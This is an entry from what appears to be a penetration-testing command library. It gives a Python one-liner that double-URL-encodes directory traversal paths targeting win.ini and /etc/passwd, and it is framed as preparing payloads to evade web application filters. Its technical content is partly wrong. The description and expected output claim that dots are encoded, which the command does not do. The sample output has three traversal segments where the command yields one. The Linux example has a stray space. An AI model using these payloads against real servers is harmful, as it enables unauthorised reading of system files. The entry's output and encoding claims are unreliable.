---
type: command
executor: bash
data: >-
  python3 -c "import urllib.parse; path = '..\\\\windows\\\\win.ini';
  print(urllib.parse.quote(urllib.parse.quote(path, safe='')))"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - encoding
  - traversal
verified: true
validated: true
---

# double-url-encode-traversal-path

## Command

```bash
python3 -c "import urllib.parse; path = '..\\\\windows\\\\win.ini'; print(urllib.parse.quote(urllib.parse.quote(path, safe='')))" 
```

## Description

This command uses Python's urllib.parse to apply double URL encoding to a directory traversal path, converting characters like '.' to '%252e' and '\' to '%255c'. It is used to prepare payloads for bypassing web application filters in traversal attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| path | The raw traversal path to encode (modify in the command string) | Yes |
| safe='' | Ensures all characters are encoded, no safe list | Built-in |

## Examples

### Basic Usage

```bash
python3 -c "import urllib.parse; path = '..\\\\windows\\\\win.ini'; print(urllib.parse.quote(urllib.parse.quote(path, safe='')))" 
```

### Advanced Usage

For Linux targets, encode forward slashes:

```bash
python3 -c "import urllib.parse; path = '.. /etc/passwd'; print(urllib.parse.quote(urllib.parse.quote(path, safe='')))" 
```

## Expected Output

A single line with the double-encoded string, e.g., %252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini

## Related

- [[procedures/Exploit-Directory-Traversal-with-Double-URL-Encoding]]
- [[commands/curl-double-encoded-traversal-to-win-ini]]
